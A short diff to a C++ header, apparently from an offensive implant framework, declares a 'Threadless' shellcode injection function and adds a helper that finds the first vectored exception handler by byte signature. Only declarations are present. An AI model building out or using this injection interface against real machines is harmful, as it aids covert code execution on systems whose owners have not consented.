@@ -11,6 +11,11 @@ typedef struct _threadless {
 } THREADLESS, *PTHREADLESS;
 
 namespace Injection {
+
     FUNCTION VOID Threadless(THREADLESS Threadless, LPVOID shellcode, SIZE_T cbShellcode, SIZE_T ccbShellcode);
+
+    namespace Veh {
+        FUNCTION UINT_PTR VehGetFirstHandler(wchar_t *name, const char *signature, const char *mask);
+    }
 }
 #endif //HEXANE_IMPLANT_INJECT_HPP
